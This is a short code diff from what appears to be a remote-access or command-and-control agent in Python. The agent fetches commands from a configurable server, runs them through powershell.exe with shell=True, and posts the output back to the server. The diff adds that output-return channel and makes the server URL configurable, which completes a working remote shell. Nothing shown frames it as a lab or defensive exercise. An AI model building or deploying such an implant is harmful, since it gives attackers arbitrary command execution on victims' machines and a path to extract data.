@@ -46,15 +46,19 @@ def get_command(agent_id):
     json = {
         'id': agent_id
     }
-    data = requests.post('http://127.0.0.1:5000/api/1.1/get_command', json=json).text
+    data = requests.post(f"{base_url}/api/1.1/get_command", json=json).text
     cmd = subprocess.Popen(["powershell.exe", data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
     output_bytes = cmd.stdout.read() + cmd.stderr.read()
     output_str = str(output_bytes, "utf-8")  # plain old basic string
-    print(output_str)
+    json['output'] = output_str
+    data = requests.post(f"{base_url}/api/1.1/command_out", json=json)
+    print(data.text)
 
 
 if __name__ == "__main__":
-    id_agent = int(register())
-    print(id_agent)
+    # id_agent = int(register())
+    # print(id_agent)
+    id_agent = 1
+    # while True:
     get_command(id_agent)
